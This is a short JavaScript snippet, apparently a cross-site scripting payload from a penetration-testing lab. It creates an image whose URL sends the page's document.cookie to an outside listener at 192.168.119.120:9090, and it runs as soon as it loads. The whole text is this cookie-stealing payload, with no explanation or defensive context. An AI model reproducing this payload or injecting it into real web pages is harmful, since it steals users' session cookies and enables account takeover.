function addTheImage() { 
 var img = document.createElement('img'); 
 img.src = 'http://192.168.119.120:9090/' + document.cookie; 
document.body.appendChild(img); 
} 
addTheImage(); 
